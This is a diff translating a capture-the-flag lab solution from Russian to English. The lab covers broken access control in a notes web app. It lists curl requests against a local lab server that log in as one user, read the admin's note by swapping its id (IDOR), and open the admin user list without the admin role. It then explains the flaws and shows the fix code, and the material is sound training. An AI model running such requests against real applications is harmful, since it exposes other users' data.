@@ -1,41 +1,41 @@
-🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)
+🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)
 
-# A01 — Решение (спойлеры!)
+# A01 — Solution (spoilers!)
 
-Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.md).
+Try the lab yourself first, using the hints from the [README](./README.md).
 
-## Эксплуатация на vulnerable (порт 8001)
+## Exploitation on vulnerable (port 8001)
 
 ```bash
-# 1. Вход как alice, cookie сохраняется в jar.txt
+# 1. Log in as alice, the cookie is saved to jar.txt
 curl -c jar.txt -H 'Content-Type: application/json' \
   -d '{"username":"alice","password":"alice123"}' http://127.0.0.1:8001/login
 
-# 2. Свои заметки: id = 1
+# 2. Your own notes: id = 1
 curl -b jar.txt http://127.0.0.1:8001/api/notes
 
-# 3. IDOR: подставляем чужой id (заметка админа = 3)
+# 3. IDOR: substitute someone else's id (the admin's note = 3)
 curl -b jar.txt http://127.0.0.1:8001/api/notes/3
-# → флаг FLAG{a01_idor_admin_note}
+# → flag FLAG{a01_idor_admin_note}
 
-# 4. Доступ к функции администратора без роли admin
+# 4. Access an administrator function without the admin role
 curl -b jar.txt http://127.0.0.1:8001/admin/users
-# → список пользователей и флаг FLAG{a01_admin_panel_open}
+# → the user list and the flag FLAG{a01_admin_panel_open}
 ```
 
-## В чём ошибка
+## What is wrong
 
-1. `GET /api/notes/<id>`: сервер проверяет только то, что пользователь вошёл, но не сверяет `note["owner"]` с текущим пользователем (**IDOR**).
-2. `GET /admin/users`: сервер не проверяет роль, достаточно любой сессии (**отсутствие проверки прав на функцию**).
+1. `GET /api/notes/<id>`: the server only checks that the user is logged in, but does not compare `note["owner"]` with the current user (**IDOR**).
+2. `GET /admin/users`: the server does not check the role, any session is enough (**missing function-level access control**).
 
-## Исправление
+## The fix
 
 ```python
-# Владелец ресурса
+# Resource owner
 if note["owner"] != current_user():
     return jsonify(error="forbidden"), 403
 
-# Роль администратора
+# Administrator role
 def admin_required(view):
     @wraps(view)
     @login_required
@@ -46,9 +46,9 @@ def admin_required(view):
     return wrapper
 ```
 
-Те же запросы на fixed (порт 8002) вернут `403 forbidden`. Админ (`admin` / `Adm1n-lab-pass`) по-прежнему имеет доступ к своим заметкам и к `/admin/users`.
+The same requests against fixed (port 8002) return `403 forbidden`. The admin (`admin` / `Adm1n-lab-pass`) still has access to their own notes and to `/admin/users`.
 
-## Что ещё стоит помнить
-- Скрытый или «непредсказуемый» URL не заменяет проверку прав.
-- Случайные идентификаторы (UUID) усложняют перебор, но не отменяют проверку владельца.
-- Проверяйте права и для операций записи и удаления, не только для чтения.
+## What else to remember
+- A hidden or "unpredictable" URL is not a substitute for a permission check.
+- Random identifiers (UUIDs) make enumeration harder but do not remove the need to check the owner.
+- Check permissions for write and delete operations too, not only for reading.
